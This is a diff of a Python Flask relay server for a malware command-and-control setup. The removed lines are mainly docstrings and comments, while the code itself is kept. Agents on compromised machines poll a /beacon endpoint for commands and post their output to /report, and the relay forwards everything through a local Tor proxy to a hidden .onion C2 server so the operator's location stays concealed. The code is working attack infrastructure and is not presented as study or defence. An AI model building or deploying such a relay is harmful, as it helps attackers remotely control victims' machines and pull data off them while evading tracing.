@@ -1,18 +1,3 @@
-"""
-Relay Server - Acts as a bridge between the Agent and the C2 Server (behind Tor).
-
-This relay runs on a public-facing machine. The agent talks to the relay over
-regular HTTP/HTTPS, and the relay forwards everything to the C2's .onion
-address through a local Tor SOCKS proxy.
-
-Requirements:
-    pip install flask requests[socks] pysocks
-
-Configuration:
-    - Set C2_ONION_URL to your C2 hidden service .onion address
-    - Tor must be running locally with SOCKS proxy on port 9050
-    - Set AUTH_TOKEN to match the C2 server's X-Auth-Token value
-"""
 
 import time
 import logging
@@ -20,10 +5,6 @@ import hashlib
 import json
 from flask import Flask, request, jsonify
 import requests
-
-# ══════════════════════════════════════════════════
-# CONFIGURATION
-# ══════════════════════════════════════════════════
 
 # The .onion address of your C2 server (behind Tor)
 C2_ONION_URL = "http://YOUR_ONION_ADDRESS.onion"
@@ -44,12 +25,8 @@ RELAY_PORT = 8443
 # Simple relay auth — agents must send this token to prove they're legit
 RELAY_AUTH_TOKEN = "CHANGE_ME_RELAY_SECRET"
 
-# Request timeout for Tor connections (onion routing is slow)
+# Request timeout for Tor connections
 TOR_TIMEOUT = 30
-
-# ══════════════════════════════════════════════════
-# APP SETUP
-# ══════════════════════════════════════════════════
 
 app = Flask(__name__)
 
@@ -70,10 +47,6 @@ def verify_relay_auth():
 
 
 def forward_to_c2(method, endpoint, params=None, json_body=None):
-    """
-    Forward a request to the C2 server through Tor.
-    Returns (response_json, status_code).
-    """
     url = f"{C2_ONION_URL}/{endpoint}"
     headers = {
         "X-Auth-Token": AUTH_TOKEN,
@@ -113,16 +86,9 @@ def forward_to_c2(method, endpoint, params=None, json_body=None):
         return {"status": "error", "message": "Relay internal error"}, 500
 
 
-# ══════════════════════════════════════════════════
-# RELAY ENDPOINTS (Agent-facing)
-# ══════════════════════════════════════════════════
-
 @app.route("/beacon", methods=["GET"])
 def beacon():
-    """
-    Agent calls this to check in and get pending commands.
-    GET /beacon?agent_id=<ID>
-    """
+
     if not verify_relay_auth():
         return jsonify({"status": "error", "message": "Unauthorized"}), 403
 
@@ -140,10 +106,7 @@ def beacon():
 
 @app.route("/report", methods=["POST"])
 def report():
-    """
-    Agent calls this to send back command output / data.
-    POST /report  (JSON body)
-    """
+
     if not verify_relay_auth():
         return jsonify({"status": "error", "message": "Unauthorized"}), 403
 
@@ -176,9 +139,6 @@ def health():
 if __name__ == "__main__":
     logger.info(f"=== Relay Server starting on {RELAY_HOST}:{RELAY_PORT} ===")
     logger.info(f"=== Forwarding to C2: {C2_ONION_URL} ===")
-
-    # For production, use gunicorn or waitress instead of Flask dev server
-    # Example: waitress-serve --host=0.0.0.0 --port=8443 relay_server:app
     app.run(
         host=RELAY_HOST,
         port=RELAY_PORT,
